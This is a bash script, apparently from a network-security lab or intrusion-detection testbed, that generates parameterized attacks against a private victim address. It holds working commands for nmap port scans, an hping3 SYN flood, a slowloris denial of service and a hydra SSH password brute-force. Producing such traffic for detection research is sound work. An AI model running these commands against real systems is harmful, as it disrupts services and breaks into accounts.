#!/usr/bin/env bash
# Attack generator (parameterized): counts/ports/sockets come from env vars set
# by run_scenario, so each bout varies while attack semantics stay fixed.
# Use: attacks.sh FAMILY [VICTIM]
#   FAMILY = portscan | portscan_svc | dos_syn | dos_slow | bruteforce

set -u

FAMILY="${1:?usage: attacks.sh FAMILY [victim]}"
VICTIM="${2:-172.30.0.10}"

case "$FAMILY" in
  portscan)
    echo "[attack] portscan SYN (${SCAN_PORTS:-1-1024}) -> $VICTIM"
    nmap -sS -T4 -p "${SCAN_PORTS:-1-1024}" "$VICTIM"
    ;;
  portscan_svc)
    echo "[attack] portscan svc (${SCAN_PORTS:-21,22,80,443,3306,8080}) -> $VICTIM"
    nmap -sV -T4 -p "${SCAN_PORTS:-21,22,80,443,3306,8080}" "$VICTIM"
    ;;
  dos_syn)
    echo "[attack] dos SYN flood (c=${DOS_COUNT:-2500} i=${DOS_INTERVAL:-u500}) -> ${VICTIM}:80"
    hping3 -S -p 80 -i "${DOS_INTERVAL:-u500}" -c "${DOS_COUNT:-2500}" "$VICTIM"
    ;;
  dos_slow)
    echo "[attack] dos slowloris (s=${SLOW_SOCKETS:-200} ${SLOW_DURATION:-45}s) -> ${VICTIM}:80"
    timeout "${SLOW_DURATION:-45}s" slowloris "$VICTIM" -p 80 \
        -s "${SLOW_SOCKETS:-200}" --sleeptime "${SLOW_SLEEP:-15}" || true
    ;;
  bruteforce)
    echo "[attack] ssh brute-force (${WORDLIST:-/scripts/passwords.txt}) -> $VICTIM"
    hydra -l victimuser -P "${WORDLIST:-/scripts/passwords.txt}" -t 4 -I "ssh://${VICTIM}"
    ;;
  *)
    echo "unknown family: $FAMILY" >&2; exit 2 ;;
esac
echo "[attack] $FAMILY done"